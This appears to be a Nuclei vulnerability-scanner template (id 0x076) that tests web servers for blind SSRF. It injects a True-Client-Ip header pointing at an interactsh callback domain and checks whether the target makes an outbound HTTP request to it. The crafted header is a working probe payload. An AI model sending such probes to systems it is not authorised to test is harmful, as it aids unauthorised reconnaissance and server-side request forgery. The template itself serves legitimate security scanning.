id: 0x076

info:
  name: Blind SSRF
  author: 0xAwali
  severity: low

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        True-Client-Ip: {{Host}}.{{Port}}.BSSRF-076.{{interactsh-url}}/.{{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Cache-Control: no-transform
        Accept-Encoding: gzip, deflate
        Accept: */*

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"